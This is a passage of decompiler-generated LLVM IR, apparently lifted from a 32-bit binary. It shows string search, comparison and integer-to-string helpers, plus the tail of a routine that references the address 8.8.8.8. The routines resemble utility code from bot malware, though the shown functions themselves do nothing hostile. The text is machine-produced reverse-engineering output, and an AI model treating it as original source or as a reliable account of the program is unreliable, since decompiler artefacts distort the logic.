dec_label_pc_8051e90:                             ; preds = %dec_label_pc_8051e60
  %v2_8051e90 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051e90, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8051eaf = call i32 @function_80527aa(i32 %v3_8051e7f, i32 %v2_8051e90, i32 16)
  %v2_8051eb7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8051ebd = load i32, i32* %esi.global-to-local, align 4
  %v3_8051ebe = call i32 @function_80527d5(i32 %v0_8051ebd, i32 %v2_8051e90, i32 %v2_8051eb7)
  %v1_8051ec6 = call i32 @function_8052191(i32 %v0_8051ebd)
  br label %dec_label_pc_8051ed2

dec_label_pc_8051ed2:                             ; preds = %dec_label_pc_8051e60, %dec_label_pc_8051e90
  %v0_8051ed7 = phi i32 [ 0, %dec_label_pc_8051e60 ], [ 134744072, %dec_label_pc_8051e90 ]
  ret i32 %v0_8051ed7

; uselistorder directives
  uselistorder i32 %v3_8051e7f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80527aa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8052985, { 6, 5, 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8051ed2, { 1, 0 }
}

define i32 @function_8051ee0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ee0:
  %tmp19 = inttoptr i32 %arg3 to i8*
  %v2_8051ef2 = load i8, i8* %tmp19, align 1
  %v3_8051ef2 = icmp eq i8 %v2_8051ef2, 0
  br i1 %v3_8051ef2, label %dec_label_pc_8051f08, label %dec_label_pc_8051ef8

dec_label_pc_8051ef8:                             ; preds = %dec_label_pc_8051ee0, %dec_label_pc_8051ef8
  %v2_8051ef8 = phi i32 [ %v1_8051efb, %dec_label_pc_8051ef8 ], [ 0, %dec_label_pc_8051ee0 ]
  %v1_8051efb = add i32 %v2_8051ef8, 1
  %v2_8051f02 = add i32 %v1_8051efb, %arg3
  %v3_8051f02 = inttoptr i32 %v2_8051f02 to i8*
  %v4_8051f02 = load i8, i8* %v3_8051f02, align 1
  %v5_8051f02 = icmp eq i8 %v4_8051f02, 0
  %v1_8051f06 = icmp eq i1 %v5_8051f02, false
  br i1 %v1_8051f06, label %dec_label_pc_8051ef8, label %dec_label_pc_8051f08

dec_label_pc_8051f08:                             ; preds = %dec_label_pc_8051ef8, %dec_label_pc_8051ee0
  %v2_8051f3f = phi i32 [ 0, %dec_label_pc_8051ee0 ], [ %v1_8051efb, %dec_label_pc_8051ef8 ]
  %v4_8051f0e = ptrtoint i8* %arg1 to i32
  %tmp26 = icmp slt i32 %arg2, 1
  br i1 %tmp26, label %dec_label_pc_8051f3c, label %dec_label_pc_8051f16.preheader

dec_label_pc_8051f16.preheader:                   ; preds = %dec_label_pc_8051f08
  %v4_8051f16.pre = load i32, i32* @ecx, align 4
  %v6_8051f18.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051f16

dec_label_pc_8051f16:                             ; preds = %dec_label_pc_8051f16.preheader, %dec_label_pc_8051f37
  %v0_8051f37 = phi i32 [ %arg2, %dec_label_pc_8051f16.preheader ], [ %v1_8051f37, %dec_label_pc_8051f37 ]
  %v6_8051f18 = phi i32 [ %v6_8051f18.pre, %dec_label_pc_8051f16.preheader ], [ %v2_8051f31, %dec_label_pc_8051f37 ]
  %v0_8051f45 = phi i32 [ 0, %dec_label_pc_8051f16.preheader ], [ %v1_8051f189, %dec_label_pc_8051f37 ]
  %v4_8051f16 = phi i32 [ %v4_8051f16.pre, %dec_label_pc_8051f16.preheader ], [ %v0_8051f31, %dec_label_pc_8051f37 ]
  %v0_8051f1c = phi i32 [ %v4_8051f0e, %dec_label_pc_8051f16.preheader ], [ %v1_8051f1c, %dec_label_pc_8051f37 ]
  %v1_8051f16 = inttoptr i32 %v0_8051f1c to i8*
  %v2_8051f16 = load i8, i8* %v1_8051f16, align 1
  %v3_8051f16 = zext i8 %v2_8051f16 to i32
  %v5_8051f16 = and i32 %v4_8051f16, -256
  %v6_8051f16 = or i32 %v3_8051f16, %v5_8051f16
  store i32 %v6_8051f16, i32* @ecx, align 4
  %v2_8051f18 = add i32 %v0_8051f45, %arg3
  %v3_8051f18 = inttoptr i32 %v2_8051f18 to i8*
  %v4_8051f18 = load i8, i8* %v3_8051f18, align 1
  %v5_8051f18 = zext i8 %v4_8051f18 to i32
  %v7_8051f18 = and i32 %v6_8051f18, -256
  %v8_8051f18 = or i32 %v5_8051f18, %v7_8051f18
  %v1_8051f1c = add i32 %v0_8051f1c, 1
  %v1_8051f1d = add i8 %v2_8051f16, -65
  %v8_8051f22 = icmp ugt i8 %v1_8051f1d, 25
  br i1 %v8_8051f22, label %dec_label_pc_8051f27, label %dec_label_pc_8051f24

dec_label_pc_8051f24:                             ; preds = %dec_label_pc_8051f16
  %v1_8051f24 = or i32 %v6_8051f16, 96
  store i32 %v1_8051f24, i32* @ecx, align 4
  br label %dec_label_pc_8051f27

dec_label_pc_8051f27:                             ; preds = %dec_label_pc_8051f16, %dec_label_pc_8051f24
  %v0_8051f31 = phi i32 [ %v6_8051f16, %dec_label_pc_8051f16 ], [ %v1_8051f24, %dec_label_pc_8051f24 ]
  %v1_8051f27 = add i8 %v4_8051f18, -65
  %v8_8051f2c = icmp ugt i8 %v1_8051f27, 25
  br i1 %v8_8051f2c, label %dec_label_pc_8051f31, label %dec_label_pc_8051f2e

dec_label_pc_8051f2e:                             ; preds = %dec_label_pc_8051f27
  %v1_8051f2e = or i32 %v8_8051f18, 96
  br label %dec_label_pc_8051f31

dec_label_pc_8051f31:                             ; preds = %dec_label_pc_8051f27, %dec_label_pc_8051f2e
  %v2_8051f31 = phi i32 [ %v8_8051f18, %dec_label_pc_8051f27 ], [ %v1_8051f2e, %dec_label_pc_8051f2e ]
  %v1_8051f31 = trunc i32 %v0_8051f31 to i8
  %v3_8051f31 = trunc i32 %v2_8051f31 to i8
  %v15_8051f31 = icmp eq i8 %v1_8051f31, %v3_8051f31
  br i1 %v15_8051f31, label %dec_label_pc_8051f45, label %dec_label_pc_8051f35

dec_label_pc_8051f35:                             ; preds = %dec_label_pc_8051f31
  br label %dec_label_pc_8051f37

dec_label_pc_8051f37:                             ; preds = %dec_label_pc_8051f45, %dec_label_pc_8051f35
  %v1_8051f189 = phi i32 [ %v1_8051f45, %dec_label_pc_8051f45 ], [ 0, %dec_label_pc_8051f35 ]
  %v1_8051f37 = add i32 %v0_8051f37, -1
  %tmp27 = icmp slt i32 %v1_8051f37, 1
  %tmp28 = icmp eq i1 %tmp27, false
  br i1 %tmp28, label %dec_label_pc_8051f16, label %dec_label_pc_8051f3c

dec_label_pc_8051f3c:                             ; preds = %dec_label_pc_8051f37, %dec_label_pc_8051f08
  store i32 %v2_8051f3f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051f45:                             ; preds = %dec_label_pc_8051f31
  %v1_8051f45 = add i32 %v0_8051f45, 1
  %v14_8051f46 = icmp eq i32 %v2_8051f3f, %v1_8051f45
  %v1_8051f49 = icmp eq i1 %v14_8051f46, false
  br i1 %v1_8051f49, label %dec_label_pc_8051f37, label %dec_label_pc_8051f4b

dec_label_pc_8051f4b:                             ; preds = %dec_label_pc_8051f45
  store i32 %v4_8051f0e, i32* @ecx, align 4
  %v2_8051f51 = sub i32 %v1_8051f1c, %v4_8051f0e
  store i32 %v2_8051f3f, i32* @edx, align 4
  ret i32 %v2_8051f51

; uselistorder directives
  uselistorder i32 %v1_8051f37, { 1, 0 }
  uselistorder i32 %v0_8051f45, { 1, 0 }
  uselistorder i32 %v4_8051f0e, { 2, 1, 0 }
  uselistorder i32 %v2_8051f3f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051f31, { 1, 0 }
  uselistorder label %dec_label_pc_8051f27, { 1, 0 }
  uselistorder label %dec_label_pc_8051f16, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef8, { 1, 0 }
}

define i32 @function_8051f60() local_unnamed_addr {
dec_label_pc_8051f60:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8051f62 = ptrtoint i8* %tmp13 to i32
  %v4_8051f68 = ptrtoint i8* %tmp to i32
  %v2_8051f6c = load i8, i8* %tmp13, align 1
  %v3_8051f6c = icmp eq i8 %v2_8051f6c, 0
  br i1 %v3_8051f6c, label %dec_label_pc_8051f78, label %dec_label_pc_8051f71

dec_label_pc_8051f71:                             ; preds = %dec_label_pc_8051f60, %dec_label_pc_8051f71
  %v0_8051f71 = phi i32 [ %v1_8051f71, %dec_label_pc_8051f71 ], [ 0, %dec_label_pc_8051f60 ]
  %v1_8051f71 = add i32 %v0_8051f71, 1
  %v2_8051f72 = add i32 %v1_8051f71, %v4_8051f62
  %v3_8051f72 = inttoptr i32 %v2_8051f72 to i8*
  %v4_8051f72 = load i8, i8* %v3_8051f72, align 1
  %v5_8051f72 = icmp eq i8 %v4_8051f72, 0
  %v1_8051f76 = icmp eq i1 %v5_8051f72, false
  br i1 %v1_8051f76, label %dec_label_pc_8051f71, label %dec_label_pc_8051f78

dec_label_pc_8051f78:                             ; preds = %dec_label_pc_8051f71, %dec_label_pc_8051f60
  %v0_8051f89 = phi i32 [ 0, %dec_label_pc_8051f60 ], [ %v1_8051f71, %dec_label_pc_8051f71 ]
  %v2_8051f7a = load i8, i8* %tmp, align 1
  %v3_8051f7a = icmp eq i8 %v2_8051f7a, 0
  br i1 %v3_8051f7a, label %dec_label_pc_8051f87, label %dec_label_pc_8051f80

dec_label_pc_8051f80:                             ; preds = %dec_label_pc_8051f78, %dec_label_pc_8051f80
  %v0_8051f80 = phi i32 [ %v1_8051f80, %dec_label_pc_8051f80 ], [ 0, %dec_label_pc_8051f78 ]
  %v1_8051f80 = add i32 %v0_8051f80, 1
  %v2_8051f81 = add i32 %v1_8051f80, %v4_8051f68
  %v3_8051f81 = inttoptr i32 %v2_8051f81 to i8*
  %v4_8051f81 = load i8, i8* %v3_8051f81, align 1
  %v5_8051f81 = icmp eq i8 %v4_8051f81, 0
  %v1_8051f85 = icmp eq i1 %v5_8051f81, false
  br i1 %v1_8051f85, label %dec_label_pc_8051f80, label %dec_label_pc_8051f87

dec_label_pc_8051f87:                             ; preds = %dec_label_pc_8051f80, %dec_label_pc_8051f78
  %v0_8051f87 = phi i32 [ 0, %dec_label_pc_8051f78 ], [ %v1_8051f80, %dec_label_pc_8051f80 ]
  store i32 %v0_8051f87, i32* @edx, align 4
  %v12_8051f89 = icmp eq i32 %v0_8051f89, %v0_8051f87
  br i1 %v12_8051f89, label %dec_label_pc_8051f94.preheader, label %dec_label_pc_8051f8d

dec_label_pc_8051f94.preheader:                   ; preds = %dec_label_pc_8051f87
  %v1_8051f9417 = add i32 %v0_8051f89, -1
  store i32 %v1_8051f9417, i32* @edx, align 4
  %v10_8051f9518 = icmp eq i32 %v0_8051f89, 0
  br i1 %v10_8051f9518, label %dec_label_pc_8051fa2, label %dec_label_pc_8051f9a

dec_label_pc_8051f8d:                             ; preds = %dec_label_pc_8051f9a, %dec_label_pc_8051f87
  ret i32 0

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f9a
  %v3_8051f9a = zext i8 %v2_8051f9a to i32
  %v5_8051f9a = and i32 %v4_8051f9a20, -256
  %v6_8051f9a = or i32 %v3_8051f9a, %v5_8051f9a
  %v1_8051f92 = add i32 %v0_8051f9221, 1
  %v1_8051f93 = add i32 %v0_8051f9319, 1
  %v1_8051f94 = add i32 %v1_8051f9422, -1
  store i32 %v1_8051f94, i32* @edx, align 4
  %v10_8051f95 = icmp eq i32 %v1_8051f9422, 0
  br i1 %v10_8051f95, label %dec_label_pc_8051fa2, label %dec_label_pc_8051f9a

dec_label_pc_8051f9a:                             ; preds = %dec_label_pc_8051f94.preheader, %dec_label_pc_8051f92
  %v1_8051f9422 = phi i32 [ %v1_8051f94, %dec_label_pc_8051f92 ], [ %v1_8051f9417, %dec_label_pc_8051f94.preheader ]
  %v0_8051f9221 = phi i32 [ %v1_8051f92, %dec_label_pc_8051f92 ], [ %v4_8051f62, %dec_label_pc_8051f94.preheader ]
  %v4_8051f9a20 = phi i32 [ %v6_8051f9a, %dec_label_pc_8051f92 ], [ %v0_8051f89, %dec_label_pc_8051f94.preheader ]
  %v0_8051f9319 = phi i32 [ %v1_8051f93, %dec_label_pc_8051f92 ], [ %v4_8051f68, %dec_label_pc_8051f94.preheader ]
  %v1_8051f9a = inttoptr i32 %v0_8051f9221 to i8*
  %v2_8051f9a = load i8, i8* %v1_8051f9a, align 1
  %v3_8051f9c = inttoptr i32 %v0_8051f9319 to i8*
  %v4_8051f9c = load i8, i8* %v3_8051f9c, align 1
  %v15_8051f9c = icmp eq i8 %v2_8051f9a, %v4_8051f9c
  br i1 %v15_8051f9c, label %dec_label_pc_8051f92, label %dec_label_pc_8051f8d

dec_label_pc_8051fa2:                             ; preds = %dec_label_pc_8051f92, %dec_label_pc_8051f94.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_8051f9422, { 1, 0 }
  uselistorder i32 %v0_8051f89, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051f9a, { 1, 0 }
  uselistorder label %dec_label_pc_8051f80, { 1, 0 }
  uselistorder label %dec_label_pc_8051f71, { 1, 0 }
}

define i32 @function_8051fb0() local_unnamed_addr {
dec_label_pc_8051fb0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_8051fb2 = ptrtoint i8* %tmp14 to i32
  %v4_8051fb8 = ptrtoint i8* %tmp13 to i32
  %v2_8051fc0 = load i8, i8* %tmp14, align 1
  %v3_8051fc0 = icmp eq i8 %v2_8051fc0, 0
  br i1 %v3_8051fc0, label %dec_label_pc_8051fcc, label %dec_label_pc_8051fc5

dec_label_pc_8051fc5:                             ; preds = %dec_label_pc_8051fb0, %dec_label_pc_8051fc5
  %v0_8051fc5 = phi i32 [ %v1_8051fc5, %dec_label_pc_8051fc5 ], [ 0, %dec_label_pc_8051fb0 ]
  %v1_8051fc5 = add i32 %v0_8051fc5, 1
  %v2_8051fc6 = add i32 %v1_8051fc5, %v4_8051fb2
  %v3_8051fc6 = inttoptr i32 %v2_8051fc6 to i8*
  %v4_8051fc6 = load i8, i8* %v3_8051fc6, align 1
  %v5_8051fc6 = icmp eq i8 %v4_8051fc6, 0
  %v1_8051fca = icmp eq i1 %v5_8051fc6, false
  br i1 %v1_8051fca, label %dec_label_pc_8051fc5, label %dec_label_pc_8051fcc

dec_label_pc_8051fcc:                             ; preds = %dec_label_pc_8051fc5, %dec_label_pc_8051fb0
  %v1_8051fda = phi i32 [ 0, %dec_label_pc_8051fb0 ], [ %v1_8051fc5, %dec_label_pc_8051fc5 ]
  %v2_8051fce = load i8, i8* %tmp13, align 1
  %v3_8051fce = icmp eq i8 %v2_8051fce, 0
  br i1 %v3_8051fce, label %dec_label_pc_8051fda, label %dec_label_pc_8051fd3

dec_label_pc_8051fd3:                             ; preds = %dec_label_pc_8051fcc, %dec_label_pc_8051fd3
  %v0_8051fd3 = phi i32 [ %v1_8051fd3, %dec_label_pc_8051fd3 ], [ 0, %dec_label_pc_8051fcc ]
  %v1_8051fd3 = add i32 %v0_8051fd3, 1
  %v2_8051fd4 = add i32 %v1_8051fd3, %v4_8051fb8
  %v3_8051fd4 = inttoptr i32 %v2_8051fd4 to i8*
  %v4_8051fd4 = load i8, i8* %v3_8051fd4, align 1
  %v5_8051fd4 = icmp eq i8 %v4_8051fd4, 0
  %v1_8051fd8 = icmp eq i1 %v5_8051fd4, false
  br i1 %v1_8051fd8, label %dec_label_pc_8051fd3, label %dec_label_pc_8051fda

dec_label_pc_8051fda:                             ; preds = %dec_label_pc_8051fd3, %dec_label_pc_8051fcc
  %v1_8051fde = phi i32 [ 0, %dec_label_pc_8051fcc ], [ %v1_8051fd3, %dec_label_pc_8051fd3 ]
  %v8_8051fdc = icmp sgt i32 %tmp, %v1_8051fda
  br i1 %v8_8051fdc, label %dec_label_pc_8051fe2, label %dec_label_pc_8051fde

dec_label_pc_8051fde:                             ; preds = %dec_label_pc_8051fda
  %v7_8051fe0 = icmp sgt i32 %tmp, %v1_8051fde
  br i1 %v7_8051fe0, label %dec_label_pc_8051fe2, label %dec_label_pc_8051fe9.preheader

dec_label_pc_8051fe9.preheader:                   ; preds = %dec_label_pc_8051fde
  %v10_8051fea19 = icmp eq i32 %tmp, 0
  br i1 %v10_8051fea19, label %dec_label_pc_8051fe4, label %dec_label_pc_8051fef

dec_label_pc_8051fe2:                             ; preds = %dec_label_pc_8051fef, %dec_label_pc_8051fde, %dec_label_pc_8051fda
  br label %dec_label_pc_8051fe4

dec_label_pc_8051fe4:                             ; preds = %dec_label_pc_8051fe9.preheader, %dec_label_pc_8051fe7, %dec_label_pc_8051fe2
  %storemerge = phi i32 [ 0, %dec_label_pc_8051fe2 ], [ 1, %dec_label_pc_8051fe7 ], [ 1, %dec_label_pc_8051fe9.preheader ]
  ret i32 %storemerge

dec_label_pc_8051fe7:                             ; preds = %dec_label_pc_8051fef
  %v3_8051fef = zext i8 %v2_8051fef to i32
  %v5_8051fef = and i32 %v4_8051fef21, -256
  %v6_8051fef = or i32 %v3_8051fef, %v5_8051fef
  %v1_8051fe7 = add i32 %v0_8051fe722, 1
  %v1_8051fe8 = add i32 %v0_8051fe820, 1
  %v10_8051fea = icmp eq i32 %v1_8051fe923, 0
  br i1 %v10_8051fea, label %dec_label_pc_8051fe4, label %dec_label_pc_8051fef

dec_label_pc_8051fef:                             ; preds = %dec_label_pc_8051fe9.preheader, %dec_label_pc_8051fe7
  %v1_8051fe923.in = phi i32 [ %v1_8051fe923, %dec_label_pc_8051fe7 ], [ %tmp, %dec_label_pc_8051fe9.preheader ]
  %v0_8051fe722 = phi i32 [ %v1_8051fe7, %dec_label_pc_8051fe7 ], [ %v4_8051fb2, %dec_label_pc_8051fe9.preheader ]
  %v4_8051fef21 = phi i32 [ %v6_8051fef, %dec_label_pc_8051fe7 ], [ %v1_8051fde, %dec_label_pc_8051fe9.preheader ]
  %v0_8051fe820 = phi i32 [ %v1_8051fe8, %dec_label_pc_8051fe7 ], [ %v4_8051fb8, %dec_label_pc_8051fe9.preheader ]
  %v1_8051fe923 = add i32 %v1_8051fe923.in, -1
  %v1_8051fef = inttoptr i32 %v0_8051fe722 to i8*
  %v2_8051fef = load i8, i8* %v1_8051fef, align 1
  %v3_8051ff1 = inttoptr i32 %v0_8051fe820 to i8*
  %v4_8051ff1 = load i8, i8* %v3_8051ff1, align 1
  %v15_8051ff1 = icmp eq i8 %v2_8051fef, %v4_8051ff1
  br i1 %v15_8051ff1, label %dec_label_pc_8051fe7, label %dec_label_pc_8051fe2

; uselistorder directives
  uselistorder label %dec_label_pc_8051fef, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051fd3, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc5, { 1, 0 }
}

define i32 @function_8052000(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052000:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_8052004 = ptrtoint i32* %stack_var_-64 to i32
  %v4_805200b = trunc i64 %arg1 to i32
  store i32 %v4_805200b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8052013 = icmp eq i32 %arg3, 0
  br i1 %v2_8052013, label %dec_label_pc_8052080, label %dec_label_pc_8052017

dec_label_pc_8052017:                             ; preds = %dec_label_pc_8052000
  %v2_8052017 = icmp eq i32 %v4_805200b, 0
  %v3_8052017 = icmp slt i32 %v4_805200b, 0
  br i1 %v2_8052017, label %dec_label_pc_8052090, label %dec_label_pc_805201b

dec_label_pc_805201b:                             ; preds = %dec_label_pc_8052017
  %v9_8052020 = icmp eq i32 %arg2, 10
  br i1 %v9_8052020, label %dec_label_pc_80520ad, label %dec_label_pc_8052029

dec_label_pc_8052029:                             ; preds = %dec_label_pc_80520ad, %dec_label_pc_805201b
  br label %dec_label_pc_805202d

dec_label_pc_805202d:                             ; preds = %dec_label_pc_80520b5, %dec_label_pc_8052029
  %storemerge34 = phi i32 [ %v4_805200b, %dec_label_pc_8052029 ], [ %v1_80520b7, %dec_label_pc_80520b5 ]
  %v0_80520344 = phi i32 [ %v4_805200b, %dec_label_pc_8052029 ], [ %v1_80520b7, %dec_label_pc_80520b5 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8052029 ], [ 1, %dec_label_pc_80520b5 ]
  store i32 %storemerge34, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052032

dec_label_pc_8052032:                             ; preds = %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge, %dec_label_pc_805202d
  %v2_8052043 = phi i32 [ %v2_8052043.pre, %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge ], [ %v12_8052004, %dec_label_pc_805202d ]
  %v3_8052043 = phi i32 [ %v1_805204b, %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge ], [ 32, %dec_label_pc_805202d ]
  %v0_8052036 = phi i32 [ %v0_805204c, %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge ], [ %arg2, %dec_label_pc_805202d ]
  %v0_8052034 = phi i32 [ %div19, %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge ], [ %v0_80520344, %dec_label_pc_805202d ]
  %tmp31 = urem i32 %v0_8052034, %v0_8052036
  %v7_805203e = icmp sgt i32 %tmp31, 9
  %v1_8052040.v1_805203b.v = select i1 %v7_805203e, i32 55, i32 48
  %v1_8052040.v1_805203b = add i32 %v1_8052040.v1_805203b.v, %tmp31
  %v1_8052043 = trunc i32 %v1_8052040.v1_805203b to i8
  %v4_8052043 = add i32 %v3_8052043, 14
  %v5_8052043 = add i32 %v4_8052043, %v2_8052043
  %v6_8052043 = inttoptr i32 %v5_8052043 to i8*
  store i8 %v1_8052043, i8* %v6_8052043, align 1
  %v0_8052049 = load i32, i32* %ecx.global-to-local, align 4
  %v0_805204b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805204b = add i32 %v0_805204b, -1
  store i32 %v1_805204b, i32* %ebx.global-to-local, align 4
  %v0_805204c = load i32, i32* %esi.global-to-local, align 4
  %div19 = udiv i32 %v0_8052049, %v0_805204c
  store i32 %div19, i32* %eax.global-to-local, align 4
  %tmp32 = urem i32 %v0_8052049, %v0_805204c
  store i32 %tmp32, i32* %edx.global-to-local, align 4
  store i32 %div19, i32* %ecx.global-to-local, align 4
  %v1_8052050 = icmp ugt i32 %v0_805204c, %v0_8052049
  %v1_8052052 = icmp eq i1 %v1_8052050, false
  br i1 %v1_8052052, label %dec_label_pc_8052032.dec_label_pc_8052032_crit_edge, label %dec_label_pc_8052054

dec_label_pc_8052032.dec_label_pc_8052032_crit_edge: ; preds = %dec_label_pc_8052032
  %v2_8052043.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052032

dec_label_pc_8052054:                             ; preds = %dec_label_pc_8052032
  %v0_8052054 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052054 = icmp eq i32 %v0_8052054, 0
  %v1_8052056 = icmp eq i1 %v1_8052054, false
  br i1 %v1_8052056, label %dec_label_pc_80520a6, label %dec_label_pc_8052058

dec_label_pc_8052058:                             ; preds = %dec_label_pc_8052054
  store i32 %v0_805204b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052059

dec_label_pc_8052059:                             ; preds = %dec_label_pc_80520a6, %dec_label_pc_8052058
  %v1_8052059 = phi i32 [ %v1_8052059.pre, %dec_label_pc_80520a6 ], [ %v0_805204b, %dec_label_pc_8052058 ]
  %v0_8052059 = load i32, i32* @esp, align 4
  %v2_8052059 = add i32 %v1_8052059, 14
  %v3_8052059 = add i32 %v2_8052059, %v0_8052059
  store i32 %v3_8052059, i32* %eax.global-to-local, align 4
  %v1_805205d = inttoptr i32 %v3_8052059 to i8*
  %v2_805205d = load i8, i8* %v1_805205d, align 1
  %v3_805205d = icmp eq i8 %v2_805205d, 0
  br i1 %v3_805205d, label %dec_label_pc_80520c5, label %dec_label_pc_8052062

dec_label_pc_8052062:                             ; preds = %dec_label_pc_8052059
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052064

dec_label_pc_8052064:                             ; preds = %dec_label_pc_8052064, %dec_label_pc_8052062
  %v0_8052064 = phi i32 [ %v1_8052064, %dec_label_pc_8052064 ], [ 0, %dec_label_pc_8052062 ]
  %v1_8052064 = add i32 %v0_8052064, 1
  store i32 %v1_8052064, i32* %ecx.global-to-local, align 4
  %v2_8052065 = add i32 %v1_8052064, %v3_8052059
  %v3_8052065 = inttoptr i32 %v2_8052065 to i8*
  %v4_8052065 = load i8, i8* %v3_8052065, align 1
  %v5_8052065 = icmp eq i8 %v4_8052065, 0
  %v1_8052069 = icmp eq i1 %v5_8052065, false
  br i1 %v1_8052069, label %dec_label_pc_8052064, label %dec_label_pc_805206b

dec_label_pc_805206b:                             ; preds = %dec_label_pc_8052064
  %v10_805206b = icmp eq i32 %v0_8052064, -2
  br i1 %v10_805206b, label %dec_label_pc_8052080, label %dec_label_pc_8052070

dec_label_pc_8052070:                             ; preds = %dec_label_pc_805206b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052059, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052074

dec_label_pc_8052074:                             ; preds = %dec_label_pc_80520c5, %dec_label_pc_8052070, %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge
  %v2_8052077 = phi i32 [ %v1_805207a, %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge ], [ %arg3, %dec_label_pc_8052070 ], [ %arg3, %dec_label_pc_80520c5 ]
  %v0_8052076 = phi i32 [ %v0_805207b, %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge ], [ %v1_8052064, %dec_label_pc_8052070 ], [ 0, %dec_label_pc_80520c5 ]
  %v4_8052074 = phi i32 [ %v4_8052074.pre, %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge ], [ %v3_8052059, %dec_label_pc_8052070 ], [ %v3_8052059, %dec_label_pc_80520c5 ]
  %v0_8052074 = phi i32 [ %v1_8052079, %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge ], [ %v3_8052059, %dec_label_pc_8052070 ], [ %v3_8052059, %dec_label_pc_80520c5 ]
  %v1_8052074 = inttoptr i32 %v0_8052074 to i8*
  %v2_8052074 = load i8, i8* %v1_8052074, align 1
  %v3_8052074 = zext i8 %v2_8052074 to i32
  %v5_8052074 = and i32 %v4_8052074, -256
  %v6_8052074 = or i32 %v3_8052074, %v5_8052074
  store i32 %v6_8052074, i32* %eax.global-to-local, align 4
  %v1_8052076 = add i32 %v0_8052076, -1
  store i32 %v1_8052076, i32* %ecx.global-to-local, align 4
  %v3_8052077 = inttoptr i32 %v2_8052077 to i8*
  store i8 %v2_8052074, i8* %v3_8052077, align 1
  %v0_8052079 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052079 = add i32 %v0_8052079, 1
  store i32 %v1_8052079, i32* %edx.global-to-local, align 4
  %v0_805207a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805207a = add i32 %v0_805207a, 1
  store i32 %v1_805207a, i32* %ebx.global-to-local, align 4
  %v0_805207b = load i32, i32* %ecx.global-to-local, align 4
  %v10_805207b = icmp eq i32 %v0_805207b, -1
  %v1_805207e = icmp eq i1 %v10_805207b, false
  br i1 %v1_805207e, label %dec_label_pc_8052074.dec_label_pc_8052074_crit_edge, label %dec_label_pc_8052080.loopexit

dec_label_pc_8052074.dec_label_pc_8052074_crit_edge: ; preds = %dec_label_pc_8052074
  %v4_8052074.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052074

dec_label_pc_8052080.loopexit:                    ; preds = %dec_label_pc_8052074
  br label %dec_label_pc_8052080

dec_label_pc_8052080:                             ; preds = %dec_label_pc_8052080.loopexit, %dec_label_pc_805206b, %dec_label_pc_8052000
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052090:                             ; preds = %dec_label_pc_8052017
  store i8 48, i8* %tmp24, align 1
  %v2_8052093 = add i32 %arg3, 1
  %v3_8052093 = inttoptr i32 %v2_8052093 to i8*
  store i8 0, i8* %v3_8052093, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_80520a6:                             ; preds = %dec_label_pc_8052054
  %v0_80520a6 = load i32, i32* @esp, align 4
  %v2_80520a6 = add i32 %v0_805204b, 13
  %v3_80520a6 = add i32 %v2_80520a6, %v0_80520a6
  %v4_80520a6 = inttoptr i32 %v3_80520a6 to i8*
  store i8 45, i8* %v4_80520a6, align 1
  %v1_8052059.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052059

dec_label_pc_80520ad:                             ; preds = %dec_label_pc_805201b
  %v1_80520af = icmp eq i1 %v3_8052017, false
